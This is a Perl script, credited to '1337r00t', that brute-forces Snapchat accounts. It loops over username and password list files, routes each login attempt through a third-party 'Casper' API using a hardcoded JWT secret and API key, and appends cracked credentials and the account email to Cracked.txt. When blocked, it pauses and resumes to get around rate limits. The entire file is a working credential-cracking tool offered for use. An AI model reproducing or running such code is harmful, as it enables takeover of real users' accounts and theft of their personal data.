use LWP::UserAgent;
use JSON::WebToken;
system('clear');
system('cls');
print qq(
################################
# BruteForce SC using (Capser) #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0[w]\nw);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;
print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('clear');
system('cls');
print '
    _   _____  _____   _____    ____    ___       ___     _____   
   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
 u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
 _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
';
print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $password (@PASSS) {
chomp $password;
	foreach $username (@USERS) {
	chomp $username;
		$casper = LWP::UserAgent->new();
		$jwt = JSON::WebToken->encode({
		sub => 'Joe',
		username => $username,
		password => $password,
		iat => time,
		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
		$casper->default_header('user-agent' => "Snapchat/10.0 (iPhone7;iOS10.1.1;gzip)");
		$req_sc = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
		#####################3
		$snapchat = LWP::UserAgent->new();
		$snapchat->default_header('Accept-Language' => $req_sc->content=~/"Accept-Language":"(.+?)"/);
		$snapchat->default_header('Accept-Locale' => $req_sc->content=~/"Accept-Locale":"(.+?)"/);
		$snapchat->default_header('User-Agent' => $req_sc->content=~/"User-Agent":"(.+?)"/);
		$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $req_sc->content=~/"X-Snapchat-Client-Auth-Token":"(.+?)"/);
		$snapchat->default_header('X-Snapchat-Client-Token' => $req_sc->content=~/"X-Snapchat-Client-Token":"(.+?)"/);
		$snapchat->default_header('X-Snapchat-UUID' => $req_sc->content=~/"X-Snapchat-UUID":"(.+?)"/);
		$response = $snapchat->post($req_sc->content=~/"url":"(.+?)"/ ,
			{ 
			password => $password,
			req_token => $req_sc->content=~/"req_token":"(.+?)"/,
			timestamp => $req_sc->content=~/"timestamp":"(.+?)"/,
			username => $username
			}
			);
		$code = $response->status_line();
		if($code=~/200/){
			if($response->content=~/"logged":true/){
				print "-----\nCracked -> ($username:$password)\nEmail: [ ";
				print $response->content=~/"email":"(.+?)"/;
				print " ]\n-----\n";
				open(R0T,">>Cracked.txt");
				print R0T "\n($username:$password:[Email: ";
				print R0T $response->content=~/"email":"(.+?)"/;
				print R0T " ])\n";
				close(R0T);
				sleep(2)
			}
			else
			{
				if($response->content=~/password is incorrect/){
					print "Failed -> ($username:$password)\n";
				}
				else
				{
					$response->content();
					print "\n";
				}
			}
		}
		else
		{
			print "\n-----\nSorry, your ip [Blocked]\nwait to bypass blocked !...\n-----\n";
			sleep(18);
		}
	}
}
########################################################
#
# Follow Me :-
# Twitter: @_1337r00t
#
########################################################
